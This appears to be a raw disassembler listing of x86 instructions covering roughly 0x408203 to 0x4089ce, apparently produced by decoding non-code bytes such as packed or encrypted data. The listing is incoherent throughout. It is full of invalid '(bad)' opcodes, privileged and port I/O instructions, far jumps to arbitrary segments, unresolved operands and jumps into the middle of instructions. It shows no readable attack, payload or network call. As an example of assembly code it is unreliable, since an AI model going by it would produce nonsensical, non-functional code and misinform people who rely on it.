  408203:	cmp    al,0x8f
  408205:	push   edi
  408206:	aam    0x35
  408208:	mov    ds:0x316dbd28,al
  40820d:	popf   
  40820e:	adc    al,cl
  408210:	call   DWORD PTR ds:0xbd3ba965
  408216:	fwait
  408217:	and    BYTE PTR [edx+0x49],dh
  40821a:	int    0xb8
  40821c:	cmp    edx,DWORD PTR ds:0xc622ef7
  408222:	cwde   
  408223:	push   esp
  408224:	repnz xchg ebx,eax
  408226:	dec    ecx
  408227:	mov    ebx,0xc9d62a99
  40822c:	mov    al,0x9f
  40822e:	push   edx
  40822f:	and    dl,ch
  408231:	mov    ebx,0x4f54b3c4
  408236:	sbb    dh,BYTE PTR cs:[esi]
  408239:	jg     0x4081c0
  40823b:	pop    edi
  40823c:	ret    
  40823d:	lahf   
  40823e:	mov    bh,0xc3
  408240:	pop    ebx
  408241:	aam    0xa0
  408243:	mov    al,ds:0x979d884
  408248:	cdq    
  408249:	into   
  40824a:	dec    BYTE PTR [ecx+0x19]
  40824d:	gs mov esp,0xf0a323ae
  408253:	cmc    
  408254:	push   esp
  408255:	pop    esp
  408256:	mov    dl,0xa8
  408258:	ret    0x5dfd
  40825b:	mov    WORD PTR [edx-0x279601d7],ss
  408261:	in     al,0x81
  408263:	call   0x14d8:0x55fc4b9b
  40826a:	(bad)  
  40826b:	jmp    0x408255
  40826d:	lods   eax,DWORD PTR ds:[esi]
  40826e:	repz mov WORD PTR [ebx+eax*8+0x71348024],es
  408276:	scas   eax,DWORD PTR es:[edi]
  408277:	adc    dh,BYTE PTR [eax+0x5e37597]
  40827d:	mov    eax,0xbe6b09c6
  408282:	add    bh,BYTE PTR [ebx+0x26]
  408285:	mov    esi,0x6bffe86d
  40828a:	adc    DWORD PTR [ecx+0x6b8c4dab],ebp
  408290:	(bad)  
  408292:	(bad)  
  408293:	push   esp
  408294:	sti    
  408295:	push   cs
  408296:	scas   al,BYTE PTR es:[edi]
  408297:	sub    al,0x8e
  408299:	stos   BYTE PTR es:[edi],al
  40829a:	inc    edi
  40829b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40829c:	push   ebx
  40829d:	dec    ebx
  40829e:	repz pop esp
  4082a0:	dec    ecx
  4082a1:	aad    0xff
  4082a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082a4:	mov    al,0xcc
  4082a6:	and    DWORD PTR [ebx+0x50],ecx
  4082a9:	push   ds
  4082aa:	mov    WORD PTR [ecx+0x24],es
  4082ad:	fwait
  4082ae:	lea    ebx,[ecx]
  4082b0:	xor    al,0xdb
  4082b2:	pop    ebx
  4082b3:	cmp    DWORD PTR [esi+0x3e7d035],esp
  4082b9:	or     ah,BYTE PTR [edx]
  4082bb:	jge    0x40832c
  4082bd:	stc    
  4082be:	adc    eax,0x98aed8ba
  4082c3:	push   cs
  4082c4:	daa    
  4082c5:	and    ebx,DWORD PTR [edi]
  4082c7:	jo     0x408290
  4082c9:	pop    edx
  4082ca:	dec    ebp
  4082cb:	ja     0x408294
  4082cd:	imul   edi,edx,0xa7308a47
  4082d3:	jno    0x4082db
  4082d5:	into   
  4082d6:	mov    eax,0x9df8198a
  4082db:	jecxz  0x4082a5
  4082dd:	jecxz  0x40831a
  4082df:	sub    al,0x8f
  4082e1:	mov    esi,0xe1f8431
  4082e6:	push   es
  4082e7:	les    edx,FWORD PTR ds:0x993d5afc
  4082ed:	cwde   
  4082ee:	(bad)  
  4082ef:	jg     0x40828d
  4082f1:	xor    BYTE PTR [eax],bh
  4082f3:	cmp    ah,bl
  4082f5:	sbb    ch,ah
  4082f7:	fbstp  TBYTE PTR [ebp+0x43]
  4082fa:	test   al,0x21
  4082fc:	pop    edi
  4082fd:	xchg   ebx,eax
  4082fe:	fmul   QWORD PTR [edi-0x7b]
  408301:	sub    DWORD PTR [ebx-0x4],edx
  408304:	push   0xfffffffc
  408306:	push   ss
  408307:	test   eax,0x507f837
  40830c:	fsub   QWORD PTR [eax]
  40830e:	mov    cl,0xad
  408310:	pop    ss
  408311:	push   ds
  408312:	scas   eax,DWORD PTR es:[edi]
  408313:	xchg   esi,eax
  408314:	xor    ecx,DWORD PTR [ebx-0x35]
  408317:	cmc    
  408318:	lods   al,BYTE PTR ds:[esi]
  408319:	jg     0x4082f4
  40831b:	xchg   edx,eax
  40831c:	retf   0x37d0
  40831f:	mov    eax,0x6ba04178
  408324:	std    
  408325:	pusha  
  408326:	xchg   DWORD PTR [ebx-0x1a],ecx
  408329:	mov    eax,ds:0xf6e55410
  40832e:	hlt    
  40832f:	sub    ah,ch
  408331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408332:	sub    ebp,DWORD PTR [ecx-0x14]
  408335:	mov    ds:0x6faecd03,al
  40833a:	add    ch,ch
  40833c:	retf   
  40833d:	push   es
  40833e:	xor    esp,esi
  408340:	loopne 0x40836f
  408342:	adc    eax,ecx
  408344:	sar    DWORD PTR [esi-0x4cc2870],1
  40834a:	jo     0x4082ff
  40834c:	add    eax,0xde16fea6
  408351:	aam    0xa6
  408353:	test   al,0x47
  408355:	fadd   DWORD PTR ds:0x31d1366c
  40835b:	test   BYTE PTR [edx+0x18fce3ac],dl
  408361:	cs adc edi,ecx
  408364:	push   0xffffffed
  408366:	jae    0x40838e
  408368:	mov    al,0xdc
  40836a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40836b:	dec    edx
  40836c:	sar    DWORD PTR [edi+edx*4],1
  40836f:	sub    eax,0xa83b5fa3
  408374:	mov    ch,0xf3
  408376:	retf   0xf213
  408379:	add    ah,BYTE PTR [edi-0x7049094c]
  40837f:	pop    edi
  408380:	push   ecx
  408381:	pop    ecx
  408382:	out    dx,eax
  408383:	mov    ebp,0xd68a560b
  408388:	mov    bh,0x27
  40838a:	outs   dx,DWORD PTR ds:[esi]
  40838b:	adc    ebx,DWORD PTR [esi-0x74]
  40838e:	jns    0x4083a6
  408390:	sahf   
  408391:	adc    esi,edi
  408393:	scas   al,BYTE PTR es:[edi]
  408394:	xor    dl,bl
  408396:	jae    0x4083a2
  408398:	fs pop ebx
  40839a:	adc    dh,ch
  40839c:	add    al,0x39
  40839e:	cld    
  40839f:	sbb    al,0x46
  4083a1:	sub    bl,BYTE PTR [edi]
  4083a3:	jns    0x408357
  4083a5:	imul   BYTE PTR [ecx-0x5e]
  4083a8:	fidiv  DWORD PTR gs:[edi-0x61]
  4083ac:	enter  0x6eb,0x10
  4083b0:	jnp    0x40836b
  4083b2:	hlt    
  4083b3:	ss pop ebp
  4083b5:	(bad)  
  4083b6:	lock inc ebp
  4083b8:	or     eax,0x4c8bd178
  4083bd:	adc    DWORD PTR [eax-0x6021318a],esi
  4083c3:	xchg   BYTE PTR [esi+edx*8+0x50],cl
  4083c7:	sub    dl,BYTE PTR [esi]
  4083c9:	pop    ebp
  4083ca:	xchg   ebp,eax
  4083cb:	xchg   edx,eax
  4083cc:	inc    edi
  4083cd:	ficom  WORD PTR [edx-0x37]
  4083d0:	scas   eax,DWORD PTR es:[edi]
  4083d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083d2:	xor    DWORD PTR [ecx+esi*8+0x7a],eax
  4083d6:	jle    0x4083a7
  4083d8:	lea    ebp,[ebp+0x3a546fcc]
  4083de:	fwait
  4083df:	imul   BYTE PTR [ebp-0x47]
  4083e2:	lock dec ebx
  4083e4:	or     esp,DWORD PTR [edx]
  4083e6:	scas   al,BYTE PTR es:[edi]
  4083e7:	jmp    0x737a8327
  4083ec:	ds ffreep st(4)
  4083ef:	inc    esi
  4083f0:	xor    edi,DWORD PTR [edi-0x13f7d102]
  4083f6:	call   0x2a36a580
  4083fb:	add    al,0x2e
  4083fd:	inc    ecx
  4083fe:	dec    edi
  4083ff:	clc    
  408400:	aam    0x74
  408402:	aas    
  408403:	or     al,0x28
  408405:	ror    dl,1
  408407:	jge    0x408437
  408409:	scas   eax,DWORD PTR es:[edi]
  40840a:	enter  0x25c1,0x4d
  40840e:	shr    DWORD PTR [esi],cl
  408410:	dec    edx
  408411:	cmc    
  408412:	sbb    DWORD PTR [edx-0x76],0xbb446498
  408419:	jns    0x408477
  40841b:	(bad)  
  40841d:	or     al,0x58
  40841f:	(bad)  
  408420:	in     eax,dx
  408421:	xor    eax,0x9f0723a3
  408426:	(bad)  
  408427:	faddp  st(2),st
  408429:	frstor [esi]
  40842b:	scas   eax,DWORD PTR es:[edi]
  40842c:	mov    eax,ds:0x798bc01a
  408431:	push   cs
  408432:	or     DWORD PTR [edi+esi*1],edx
  408435:	jns    0x408465
  408437:	sar    bl,0xdf
  40843a:	xor    al,0x61
  40843c:	adc    eax,0x321eed8c
  408441:	outs   dx,BYTE PTR ds:[esi]
  408442:	xchg   ebx,eax
  408443:	outs   dx,DWORD PTR ds:[esi]
  408444:	(bad)  
  408445:	int3   
  408446:	fs and bh,dh
  408449:	pop    esp
  40844a:	jmp    0x408453
  40844c:	movq   mm6,QWORD PTR [ecx+0x31]
  408450:	std    
  408451:	hlt    
  408452:	mov    edx,0xc2d46a0e
  408457:	add    ch,BYTE PTR [edx+0x5a]
  40845a:	mov    BYTE PTR [ebx-0xd],dh
  40845d:	add    eax,DWORD PTR [edx+0x2b]
  408460:	xchg   edx,eax
  408461:	xor    DWORD PTR [edx+0x3b602bfc],0x538035ac
  40846b:	outs   dx,DWORD PTR ds:[esi]
  40846c:	and    DWORD PTR [esi-0x56],ecx
  40846f:	out    0x4a,al
  408471:	adc    al,0x4b
  408473:	int    0xec
  408475:	xchg   ecx,eax
  408476:	idiv   DWORD PTR [eax+0x2a]
  408479:	out    dx,eax
  40847a:	jo     0x408462
  40847c:	xchg   edi,eax
  40847d:	jae    0x40842e
  40847f:	inc    ebx
  408480:	test   DWORD PTR [eax+esi*8-0x2a],ecx
  408484:	xchg   ebx,eax
  408485:	xchg   esp,eax
  408486:	stos   BYTE PTR es:[edi],al
  408487:	cmp    ebx,DWORD PTR ds:0xf6f3a682
  40848d:	cmp    bh,0xaa
  408490:	xchg   ecx,eax
  408491:	add    DWORD PTR [edi+0x6e],esi
  408494:	xchg   esi,eax
  408495:	push   esp
  408496:	cld    
  408497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408498:	mov    edi,0xfca2bea8
  40849d:	(bad)  
  40849e:	adc    cl,0x5e
  4084a1:	mov    ah,0x33
  4084a3:	stos   BYTE PTR es:[edi],al
  4084a4:	idiv   BYTE PTR [ebx+eiz*2]
  4084a7:	sub    DWORD PTR [bx+di],esi
  4084aa:	pop    ebx
  4084ab:	sbb    DWORD PTR [esi-0x68c17da2],edx
  4084b1:	sti    
  4084b2:	das    
  4084b3:	ficomp WORD PTR [esi]
  4084b5:	xor    al,0x24
  4084b7:	inc    BYTE PTR [ecx-0x6c]
  4084ba:	xchg   ebx,eax
  4084bb:	pushf  
  4084bc:	outs   dx,DWORD PTR ds:[esi]
  4084bd:	popa   
  4084be:	aam    0x2
  4084c0:	ficom  DWORD PTR [eax+0x6d]
  4084c3:	cmp    al,BYTE PTR [eax-0x23]
  4084c6:	out    dx,eax
  4084c7:	or     DWORD PTR [edi-0x7d],ebp
  4084ca:	ret    
  4084cb:	mov    ch,0x17
  4084cd:	sbb    DWORD PTR [eax],esi
  4084cf:	pop    edx
  4084d1:	push   ds
  4084d2:	push   edx
  4084d3:	add    eax,0x3dba1162
  4084d8:	push   eax
  4084d9:	sahf   
  4084da:	test   bh,dl
  4084dc:	mov    edx,0x2e44b4e6
  4084e1:	inc    edi
  4084e2:	xor    BYTE PTR [ecx+0x6b],al
  4084e5:	sbb    DWORD PTR [ecx-0xbb39384],0x1915c8e7
  4084ef:	cmp    DWORD PTR [ecx-0x41cf5306],esi
  4084f5:	adc    ecx,edi
  4084f7:	imul   ecx,eax,0x93fc9d4c
  4084fd:	mov    ah,0xec
  4084ff:	or     eax,0x2541e9e1
  408504:	sub    BYTE PTR [ecx+0x62f38d63],0x3b
  40850b:	inc    BYTE PTR [ecx-0x4b4a6c08]
  408511:	push   ebx
  408512:	and    bh,dh
  408514:	jp     0x4084b7
  408516:	jnp    0x408505
  408518:	mov    ?,WORD PTR [esi+0x76]
  40851b:	fwait
  40851c:	mov    DWORD PTR [ecx-0x14],edx
  40851f:	leave  
  408520:	xlat   BYTE PTR ds:[ebx]
  408521:	dec    eax
  408522:	repz fs dec eax
  408525:	into   
  408526:	adc    DWORD PTR [ebx],esp
  408528:	test   al,0x82
  40852a:	xor    eax,0x5fabe069
  40852f:	cmp    eax,0x288b1c97
  408534:	test   BYTE PTR [esi+0x6364fcda],dh
  40853a:	arpl   WORD PTR [ecx-0x300e3554],cx
  408540:	mov    BYTE PTR [ecx-0x79fb8faf],cl
  408546:	loopne 0x408596
  408548:	out    0x7c,al
  40854a:	sub    al,0xcc
  40854c:	test   BYTE PTR [ebp-0x4551fb81],dl
  408552:	loopne 0x4085ab
  408554:	xlat   BYTE PTR ds:[ebx]
  408555:	sahf   
  408556:	cmc    
  408557:	out    dx,eax
  408558:	sbb    ebp,eax
  40855a:	idiv   DWORD PTR [eax]
  40855c:	fimul  WORD PTR [edx+0x168fbe6c]
  408562:	push   ss
  408563:	add    edx,esi
  408565:	lds    edx,FWORD PTR [ebx]
  408567:	fadd   DWORD PTR [edi]
  408569:	out    dx,eax
  40856a:	push   ecx
  40856b:	clc    
  40856c:	int3   
  40856d:	pop    edi
  40856e:	and    DWORD PTR [ecx-0x6c],edi
  408571:	fucomp st(2)
  408573:	out    dx,eax
  408574:	shl    bl,1
  408576:	push   cs
  408577:	jbe    0x4085d6
  408579:	mov    WORD PTR [ebp+edi*1-0x58b4b895],?
  408580:	mov    eax,0x7dfa773c
  408585:	cmp    ch,BYTE PTR [ebp-0x775a9e49]
  40858b:	push   cs
  40858c:	push   edx
  40858d:	aam    0xa0
  40858f:	pop    eax
  408590:	hlt    
  408591:	je     0x4085c6
  408593:	sub    al,0x2a
  408595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408596:	jae    0x4085a3
  408598:	test   eax,0xc1870f91
  40859d:	sbb    ebp,DWORD PTR [ebp+0x4d2c70c]
  4085a3:	xor    DWORD PTR [eax],0x36
  4085a6:	int3   
  4085a7:	push   0x7c
  4085a9:	and    cl,BYTE PTR [edi+0x7943bddd]
  4085af:	push   edx
  4085b0:	adc    esi,DWORD PTR [ecx-0x410b9de0]
  4085b6:	mov    ch,0xc7
  4085b8:	retf   
  4085b9:	int3   
  4085ba:	dec    edx
  4085bb:	or     al,0x85
  4085bd:	adc    ah,BYTE PTR [edx]
  4085bf:	ins    DWORD PTR es:[edi],dx
  4085c0:	xchg   edi,eax
  4085c1:	or     eax,0x8bc82e4c
  4085c6:	inc    edx
  4085c7:	pop    esp
  4085c8:	jae    0x40863f
  4085ca:	mov    ds:0x60dbd79b,al
  4085cf:	push   edi
  4085d0:	mov    edi,0x58083498
  4085d5:	jno    0x408629
  4085d7:	cmp    eax,0xd0316c60
  4085dc:	jno    0x408618
  4085de:	stc    
  4085df:	int    0x49
  4085e1:	outs   dx,DWORD PTR ds:[esi]
  4085e2:	push   0xbfdd0e27
  4085e7:	leave  
  4085e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085e9:	xchg   edi,eax
  4085ea:	pop    ss
  4085eb:	jnp    0x408612
  4085ed:	rcr    DWORD PTR [edi-0x8],0x70
  4085f1:	and    dh,BYTE PTR [ebx-0x64]
  4085f4:	das    
  4085f5:	data16 or al,0x4d
  4085f8:	popa   
  4085f9:	test   al,0x4c
  4085fb:	mov    ah,0xe1
  4085fd:	or     DWORD PTR [esi+0x25],ecx
  408600:	pop    edi
  408601:	aam    0x75
  408603:	lea    esp,[esp+eiz*8-0x1b]
  408607:	ja     0x4085e4
  408609:	leave  
  40860a:	dec    edx
  40860b:	xchg   ebp,eax
  40860c:	mov    edx,0xd863c166
  408611:	scas   eax,DWORD PTR es:[edi]
  408612:	push   ds
  408613:	or     BYTE PTR [eax+ebp*4+0x69],dl
  408617:	xor    al,BYTE PTR [edi]
  408619:	mov    eax,ds:0x609c2ebb
  40861e:	dec    edx
  40861f:	cld    
  408620:	gs jge 0x408613
  408623:	fs xchg esi,eax
  408625:	jmp    0xbd80:0xaeef171
  40862c:	lahf   
  40862d:	ins    BYTE PTR es:[edi],dx
  40862e:	mov    al,ds:0xe607e072
  408633:	paddb  mm3,QWORD PTR [edi-0x5cc794e9]
  40863a:	test   BYTE PTR [ebx-0x590be0bf],cl
  408640:	stos   BYTE PTR es:[edi],al
  408641:	jmp    0xba2bcfb0
  408646:	lahf   
  408647:	xchg   esi,eax
  408648:	addr16 loope 0x4085db
  40864b:	jge    0x408633
  40864d:	or     BYTE PTR [eax+0x12],cl
  408650:	popf   
  408651:	clc    
  408652:	popa   
  408653:	aas    
  408654:	xchg   ebp,eax
  408655:	pushf  
  408656:	mov    eax,0xae1e4e2e
  40865b:	test   al,0x7f
  40865d:	jmp    0xa669819c
  408662:	cmp    cl,bh
  408664:	fcomi  st,st(1)
  408666:	fdivr  QWORD PTR ds:0x43cffa09
  40866c:	inc    esp
  40866d:	repnz adc ecx,DWORD PTR [ebx-0x2f]
  408671:	stc    
  408672:	dec    eax
  408673:	and    ah,cl
  408675:	adc    BYTE PTR [ebp+0x50],dl
  408678:	repz jle 0x4086f7
  40867b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40867c:	xor    DWORD PTR [edi+0x61],ebx
  40867f:	rcr    eax,cl
  408681:	stc    
  408682:	or     DWORD PTR [ebx+0x46],0xffffffd9
  408686:	std    
  408687:	jmp    0xb505:0x1235a201
  40868e:	push   esi
  40868f:	sbb    eax,0x93d97457
  408694:	fdivr  st(4),st
  408696:	jo     0x408681
  408698:	gs pusha 
  40869a:	inc    eax
  40869b:	mov    bl,0x2
  40869d:	push   ss
  40869e:	fdiv   DWORD PTR ds:0x849ed317
  4086a4:	jbe    0x4086c6
  4086a6:	icebp  
  4086a7:	ds jo  0x408651
  4086aa:	cmp    bh,BYTE PTR [eax+0x62e96c04]
  4086b0:	mov    DWORD PTR [ecx+0x3e0073c9],edx
  4086b6:	cdq    
  4086b7:	mov    ds:0x59f3362f,eax
  4086bc:	mov    BYTE PTR [edi-0x19893a84],dl
  4086c2:	div    ecx
  4086c4:	imul   eax,DWORD PTR [esi],0xa7843ff
  4086ca:	enter  0x3af2,0x22
  4086ce:	mov    ebx,0x19e5de2
  4086d3:	xchg   edx,eax
  4086d4:	ins    DWORD PTR es:[edi],dx
  4086d5:	xor    ecx,DWORD PTR [ebp-0xc]
  4086d8:	ficomp DWORD PTR [ebx+ecx*8-0xc]
  4086dc:	adc    DWORD PTR [ebx],ecx
  4086de:	outs   dx,BYTE PTR ds:[esi]
  4086df:	out    0xfb,al
  4086e1:	dec    ebp
  4086e2:	into   
  4086e3:	jmp    0x4c7a:0x77fb454e
  4086ea:	cmp    eax,esi
  4086ec:	(bad)
  4086f0:	jecxz  0x4086f1
  4086f2:	inc    ecx
  4086f3:	inc    eax
  4086f4:	pusha  
  4086f5:	push   ds
  4086f6:	jno    0x4086c6
  4086f8:	dec    ebx
  4086f9:	jne    0x408761
  4086fb:	leave  
  4086fc:	or     bl,dl
  4086fe:	imul   dl
  408700:	xor    eax,0xdf041f3c
  408705:	fwait
  408706:	and    ebp,DWORD PTR [edx+esi*2]
  408709:	and    al,0x5b
  40870b:	scas   al,BYTE PTR es:[edi]
  40870c:	popa   
  40870d:	leave  
  40870e:	push   edx
  40870f:	jb     0x4086cd
  408711:	inc    ebp
  408712:	pop    edx
  408713:	adc    eax,0x14fb56d5
  408718:	cld    
  408719:	push   ebp
  40871a:	iret   
  40871b:	ret    
  40871c:	mov    WORD PTR [esi+eiz*8+0xd],?
  408720:	mov    esp,0xce7fcebd
  408725:	jle    0x408744
  408727:	aas    
  408728:	loopne 0x4086b8
  40872a:	push   ebx
  40872b:	push   0x1d
  40872d:	xlat   BYTE PTR ds:[ebx]
  40872e:	repnz dec eax
  408730:	mov    cl,0x50
  408732:	repnz dec esi
  408734:	adc    ebx,DWORD PTR [eax-0x7a2a7d94]
  40873a:	leave  
  40873b:	cdq    
  40873c:	ins    DWORD PTR es:[edi],dx
  40873d:	loop   0x408734
  40873f:	mov    ah,0xc7
  408741:	cmp    BYTE PTR [esi],al
  408743:	mov    BYTE PTR [eax+0x279e9598],ah
  408749:	adc    al,0xa7
  40874b:	jl     0x4086e7
  40874d:	sti    
  40874e:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  408750:	xchg   edi,eax
  408751:	(bad)  
  408752:	pop    ebp
  408753:	cmc    
  408754:	adc    esi,DWORD PTR [ebx]
  408756:	lods   eax,DWORD PTR ds:[esi]
  408757:	mov    eax,ds:0x2698e873
  40875c:	(bad)  
  40875d:	cwde   
  40875e:	and    esi,esp
  408760:	jne    0x408772
  408762:	adc    al,0x6a
  408764:	popa   
  408765:	cmp    dl,BYTE PTR [eax+esi*2-0x6810c39a]
  40876c:	out    dx,eax
  40876d:	retf   
  40876e:	jecxz  0x4087e7
  408770:	ins    DWORD PTR es:[edi],dx
  408771:	scas   al,BYTE PTR es:[edi]
  408772:	xlat   BYTE PTR ds:[ebx]
  408773:	cli    
  408774:	mov    esp,0xa670395b
  408779:	sbb    DWORD PTR [edi+edi*4-0x1ba5a0f9],edx
  408780:	jle    0x4087a7
  408782:	pop    ecx
  408783:	rcr    BYTE PTR [esi-0x43],cl
  408786:	dec    edi
  408787:	cmp    eax,0xc07f7fbb
  40878c:	shl    BYTE PTR [ecx+0xd7138f9],0x4
  408793:	dec    edi
  408794:	test   BYTE PTR [ecx+0x64],bl
  408797:	jae    0x4087ce
  408799:	call   0xad640135
  40879e:	dec    edi
  40879f:	sbb    edx,DWORD PTR [edi-0xf65406]
  4087a5:	je     0x408819
  4087a7:	cmc    
  4087a8:	cmp    esp,edx
  4087aa:	imul   esp,DWORD PTR [edi],0xffffffc5
  4087ad:	out    dx,al
  4087ae:	mov    dl,0xc9
  4087b0:	add    BYTE PTR ds:0xc1299937,0x48
  4087b7:	ja     0x4087ea
  4087b9:	imul   ebx,DWORD PTR [edi+0x26],0x2b
  4087bd:	cmp    eax,0xe0ce6796
  4087c2:	retf   0x2d01
  4087c5:	sub    edx,DWORD PTR [ecx+ebx*8+0x39]
  4087c9:	je     0x40882d
  4087cb:	push   ss
  4087cc:	jecxz  0x408795
  4087ce:	mov    ds:0xff141da3,eax
  4087d3:	or     BYTE PTR [ecx+ecx*4-0x78e8bd97],0xb8
  4087db:	jge    0x4087ae
  4087dd:	repz repz sub esi,DWORD PTR [edi+0x2d]
  4087e2:	mov    eax,ds:0x8e76c97f
  4087e7:	xor    dh,BYTE PTR [ecx-0x7c934414]
  4087ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087ee:	xchg   esp,eax
  4087ef:	dec    esi
  4087f0:	(bad)  
  4087f1:	sub    ah,BYTE PTR [eax]
  4087f3:	popf   
  4087f4:	jle    0x408789
  4087f6:	mov    eax,ds:0xc5ce56a3
  4087fb:	mov    ebx,0xb8066a7d
  408800:	lods   eax,DWORD PTR ds:[esi]
  408801:	mov    ebx,0xc7a2e06
  408806:	fdiv   DWORD PTR [ebx]
  408808:	sbb    bh,BYTE PTR [edx]
  40880a:	xor    cl,BYTE PTR [ebp+0xf]
  40880d:	rol    DWORD PTR [esi+0x6c],1
  408810:	inc    edx
  408811:	xor    DWORD PTR [bp+0x4640],esi
  408816:	je     0x40886e
  408818:	xchg   esi,eax
  408819:	mov    DWORD PTR [esi+0x332f0bbd],edi
  40881f:	or     ah,0xe1
  408822:	or     edx,edx
  408824:	push   0x75e8c0d8
  408829:	test   al,0x84
  40882b:	ret    
  40882c:	sbb    eax,0xbddee06c
  408831:	lods   al,BYTE PTR ds:[esi]
  408832:	mov    ah,0xea
  408834:	and    eax,0xc1910f64
  408839:	ins    DWORD PTR es:[edi],dx
  40883a:	fwait
  40883b:	lods   al,BYTE PTR ds:[esi]
  40883c:	xor    ah,BYTE PTR [ecx]
  40883e:	mov    edi,0x3b962efd
  408843:	xchg   edi,eax
  408844:	mov    ecx,0xbaa6501f
  408849:	pop    edx
  40884a:	rcl    ebp,0x5c
  40884d:	fwait
  40884e:	push   ss
  40884f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408850:	in     eax,0x5e
  408852:	mov    al,0x71
  408854:	mov    dh,0xf7
  408856:	mov    ch,0x66
  408858:	lods   al,BYTE PTR ds:[esi]
  408859:	pop    ebp
  40885a:	jno    0x408889
  40885c:	jb     0x408865
  40885e:	adc    cl,cl
  408860:	sti    
  408861:	sti    
  408862:	fwait
  408863:	push   edx
  408864:	adc    eax,0xdcaca62a
  408869:	fsubr  st(5),st
  40886b:	push   0xf98c5b8
  408870:	dec    esi
  408871:	cdq    
  408872:	pop    edx
  408873:	pusha  
  408874:	mov    cs,WORD PTR [ebx]
  408876:	ret    
  408877:	dec    ecx
  408878:	ror    DWORD PTR [ebp-0x1e60deaa],1
  40887e:	mov    ds:0x68346734,al
  408883:	add    BYTE PTR [eax-0x2c7d1b31],bl
  408889:	sub    eax,0x6dc5a1a8
  40888e:	icebp  
  40888f:	inc    esp
  408890:	loopne 0x408867
  408892:	out    dx,al
  408893:	jns    0x408863
  408895:	inc    edi
  408896:	into   
  408897:	xchg   ecx,eax
  408898:	addr16 mov cl,0x43
  40889b:	loope  0x40890f
  40889d:	mov    WORD PTR [eax+eax*2-0x6e9529c4],fs
  4088a4:	jno    0x408836
  4088a6:	retf   
  4088a7:	mov    ebx,0x504c80c1
  4088ac:	bound  eax,QWORD PTR [esi+eax*1]
  4088af:	sbb    eax,DWORD PTR [ebx+0x40]
  4088b2:	jl     0x4088b2
  4088b4:	mul    BYTE PTR [ebp+0x350b605e]
  4088ba:	xchg   edx,eax
  4088bb:	popf   
  4088bc:	in     al,dx
  4088bd:	fmul   st(0),st
  4088bf:	add    DWORD PTR [esi-0x71],ebx
  4088c2:	mov    ds:0x1e7ab614,al
  4088c7:	jb     0x408903
  4088c9:	in     al,0x4e
  4088cb:	pusha  
  4088cc:	adc    edi,edi
  4088ce:	es (bad) 
  4088d0:	ror    BYTE PTR [ebp+eax*4+0x157ef6a3],1
  4088d7:	fucomp st(0)
  4088d9:	loopne 0x4088cd
  4088db:	mov    al,0xdf
  4088dd:	pusha  
  4088de:	jle    0x4088b2
  4088e0:	pop    edi
  4088e1:	sub    DWORD PTR [ecx+ebx*4-0x63],esp
  4088e5:	icebp  
  4088e6:	pop    ebp
  4088e7:	and    al,0x98
  4088e9:	jl     0x4088a9
  4088eb:	leave  
  4088ec:	sub    eax,0xe696199f
  4088f1:	jmp    0x1073:0x74f980d0
  4088f8:	popa   
  4088f9:	sbb    edx,0xffffff96
  4088fc:	jb     0x40892e
  4088fe:	mov    bh,0xf1
  408900:	gs shl ah,0xa8
  408904:	mov    ecx,0x6f5becb9
  408909:	and    DWORD PTR [eax+0x8355aaa],edx
  40890f:	sub    eax,0x6a4a3556
  408914:	nop
  408915:	mov    ds:0xb012542f,eax
  40891a:	pop    esi
  40891b:	out    dx,eax
  40891c:	int    0x7d
  40891e:	retf   
  40891f:	or     esp,DWORD PTR es:[ebx-0x26192c7d]
  408926:	mov    ecx,0x90523717
  40892b:	(bad)  
  40892c:	sar    esp,cl
  40892e:	inc    esp
  40892f:	ret    0x1be1
  408932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408933:	xor    dl,BYTE PTR [edi-0x54]
  408936:	cs jmp 0x6ce1:0xbfa675dd
  40893e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40893f:	xchg   ebp,eax
  408940:	or     al,0x2f
  408942:	out    0x97,al
  408944:	test   BYTE PTR [esi],al
  408946:	repnz imul ebx,DWORD PTR ds:[esi],0x16
  40894b:	mov    ecx,0x6c99dc35
  408950:	push   edx
  408951:	retf   
  408952:	(bad)  
  408953:	fwait
  408954:	mov    ss,WORD PTR [ebx+0x20]
  408957:	lahf   
  408958:	clc    
  408959:	lahf   
  40895a:	aaa    
  40895b:	mov    edi,DWORD PTR [ebp+0x557e4052]
  408961:	inc    ecx
  408962:	addr16 int 0xdd
  408965:	fisub  DWORD PTR [ebx]
  408967:	ins    DWORD PTR es:[edi],dx
  408968:	fwait
  408969:	in     eax,dx
  40896a:	in     al,dx
  40896b:	icebp  
  40896c:	mov    cl,0x3d
  40896e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40896f:	xor    ecx,DWORD PTR [esi]
  408971:	mov    dl,0xf3
  408973:	xor    DWORD PTR [ebx-0x6da5b5e5],edx
  408979:	mov    ch,0xab
  40897b:	mov    bl,0x5d
  40897d:	pop    ebp
  40897e:	cs jbe 0x408971
  408981:	daa    
  408982:	mov    edx,0xeed8972f
  408987:	shr    DWORD PTR [edi+0x3219a576],0x70
  40898e:	cmp    esp,DWORD PTR [edi]
  408990:	lock mov ebp,0xfd0c176e
  408996:	fimul  DWORD PTR [eax-0x54b8d85a]
  40899c:	fs test al,0xbc
  40899f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089a0:	or     eax,0x15fc1653
  4089a5:	add    DWORD PTR [eax+0x8444663],ebx
  4089ab:	ds and edx,edx
  4089ae:	pop    ebx
  4089af:	jmp    0xdbd2:0x47bfa059
  4089b6:	sub    eax,DWORD PTR [eax+0x5103314f]
  4089bc:	aam    0xd8
  4089be:	aam    0x3b
  4089c0:	add    DWORD PTR [edi-0x625b5b1d],0x657b3d94
  4089ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089cb:	neg    DWORD PTR [edx-0x4b]
  4089ce:	sahf   
